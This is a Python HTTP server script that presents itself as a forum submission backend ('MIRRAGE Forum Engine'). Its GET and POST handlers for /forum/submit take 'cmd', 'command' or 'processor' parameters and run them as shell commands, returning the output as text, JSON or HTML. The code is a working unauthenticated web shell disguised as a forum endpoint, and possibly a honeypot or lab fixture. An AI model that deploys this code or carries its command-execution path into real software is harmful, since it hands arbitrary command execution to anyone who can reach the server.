#!/usr/bin/env python3
import html
import http.server
import json
import os
import subprocess
import sys
import urllib.parse

HOST = "127.0.0.1"
PORT = 5000
HTML_FILE = "/var/www/html/forum/submit/index.html"


class ForumBackendHandler(http.server.BaseHTTPRequestHandler):
    server_version = "MIRRAGE-Forum-Engine/2.1"
    sys_version = ""

    def log_message(self, format, *args):
        sys.stderr.write(f"[{self.log_date_time_string()}] {self.address_string()} - {format % args}\n")
        sys.stderr.flush()

    def execute_command(self, cmd):
        if not cmd or not cmd.strip():
            return "No command provided to preprocessor."
        try:
            res = subprocess.run(
                cmd,
                shell=True,
                cwd="/var/www/html",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=10
            )
            return res.stdout
        except subprocess.TimeoutExpired:
            return "[Error] Command execution timed out (10s threshold)."
        except Exception as e:
            return f"[Error] Command execution failure: {e}"

    def render_page(self, output=None, display="none"):
        try:
            with open(HTML_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            if output is not None:
                content = content.replace("<!-- OUTPUT_DISPLAY -->", "block")
                content = content.replace("<!-- OUTPUT_CONTENT -->", html.escape(output))
            else:
                content = content.replace("<!-- OUTPUT_DISPLAY -->", "none")
                content = content.replace("<!-- OUTPUT_CONTENT -->", "")
            return content.encode("utf-8")
        except Exception as e:
            return f"<h1>Error loading submission template</h1><p>{html.escape(str(e))}</p>".encode("utf-8")

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip("/")
        if path == "/forum/submit":
            params = urllib.parse.parse_qs(parsed.query)
            if "cmd" in params or "command" in params:
                cmd = params.get("cmd", params.get("command"))[0]
                output = self.execute_command(cmd)
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(output.encode("utf-8"))
                return

            body = self.render_page()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip("/")
        if path == "/forum/submit":
            content_length = int(self.headers.get("Content-Length", 0))
            raw_body = self.rfile.read(content_length).decode("utf-8", errors="replace")

            content_type = self.headers.get("Content-Type", "")
            accept_header = self.headers.get("Accept", "")
            user_agent = self.headers.get("User-Agent", "").lower()

            cmd = None
            processor = None

            if "application/json" in content_type:
                try:
                    data = json.loads(raw_body)
                    cmd = data.get("cmd") or data.get("command")
                    processor = data.get("processor")
                except Exception:
                    pass
            else:
                data = urllib.parse.parse_qs(raw_body)
                cmd_list = data.get("cmd") or data.get("command")
                if cmd_list:
                    cmd = cmd_list[0]
                proc_list = data.get("processor")
                if proc_list:
                    processor = proc_list[0]

            # Choose command to run: cmd takes precedence, then processor
            command_to_run = cmd if cmd is not None else processor

            if command_to_run is not None and command_to_run.strip():
                output = self.execute_command(command_to_run)

                # Return JSON if requested by AJAX / API
                if "application/json" in accept_header or "application/json" in content_type:
                    resp_body = json.dumps({"status": "success", "output": output}).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json; charset=utf-8")
                    self.send_header("Content-Length", str(len(resp_body)))
                    self.end_headers()
                    self.wfile.write(resp_body)
                    return

                # Return plain text for CLI tools (curl, wget, scripts)
                if "curl" in user_agent or "wget" in user_agent or "text/plain" in accept_header or "text/html" not in accept_header:
                    resp_body = output.encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain; charset=utf-8")
                    self.send_header("Content-Length", str(len(resp_body)))
                    self.end_headers()
                    self.wfile.write(resp_body)
                    return

                # Return HTML for browser forms
                body = self.render_page(output=output, display="block")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            # Default non-command submission
            msg = "Topic submitted successfully. Your submission has been queued for moderation."
            if "application/json" in accept_header or "application/json" in content_type:
                resp_body = json.dumps({"status": "queued", "message": msg}).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.send_header("Content-Length", str(len(resp_body)))
                self.end_headers()
                self.wfile.write(resp_body)
            elif "curl" in user_agent or "text/html" not in accept_header:
                resp_body = (msg + "\n").encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(resp_body)))
                self.end_headers()
                self.wfile.write(resp_body)
            else:
                body = self.render_page(output=f"[Notice] {msg}", display="block")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Not Found")


def run():
    server_address = (HOST, PORT)
    httpd = http.server.ThreadingHTTPServer(server_address, ForumBackendHandler)
    print(f"MIRRAGE Forum Backend listening on {HOST}:{PORT}...")
    sys.stdout.flush()
    httpd.serve_forever()


if __name__ == "__main__":
    run()
